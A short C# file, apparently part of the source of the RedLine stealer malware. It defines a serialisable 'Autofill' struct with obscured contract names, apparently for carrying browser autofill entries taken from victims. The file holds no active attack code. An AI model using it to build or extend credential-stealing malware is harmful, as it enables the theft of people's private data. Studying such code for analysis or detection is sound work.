using System.Runtime.Serialization;
using ProtoBuf;

namespace RedLine.SharedModels;

[ProtoContract(Name = "Autofill")]
[DataContract(Name = "Entity8", Namespace = "Entity")]
public struct Autofill
{
	[ProtoMember(1, Name = "Name")]
	[DataMember(Name = "Id1")]
	public string Name { get; set; }

	[DataMember(Name = "Id2")]
	[ProtoMember(2, Name = "Value")]
	public string Value { get; set; }
}
